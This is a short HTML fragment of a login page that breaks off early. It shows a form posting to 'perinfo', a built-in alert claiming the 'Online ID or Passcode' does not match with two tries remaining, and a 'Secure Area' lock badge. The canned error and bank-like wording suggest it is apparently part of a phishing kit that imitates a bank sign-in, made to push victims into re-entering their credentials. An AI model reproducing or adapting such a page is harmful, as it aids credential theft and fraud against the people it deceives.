...
<div class="login-form" style="padding-left:5%;padding-right:5%;">
  <form action="perinfo" class="validate-form" method="post" style="width: 390px;">
    <h2 class="text-center"></br></h2>    
    <div class="form-group">
	<div style="padding-top:10px;">
	<div class="alert alert-danger alert-dismissible fade show">
			<h1 class="alert-heading"><i class="fa fa-warning"></i> </h1>
			<p>The Online ID or Passcode you entered does not match our records. You have 2 more tries remaining.
Please try again.</p>
			<hr>
			</div>
		 <p><img src="images/locki.svg" width="20" height="20" alt=""> <b style="padding-top:2px;"><font color="gray">Secure Area</font></b></p>
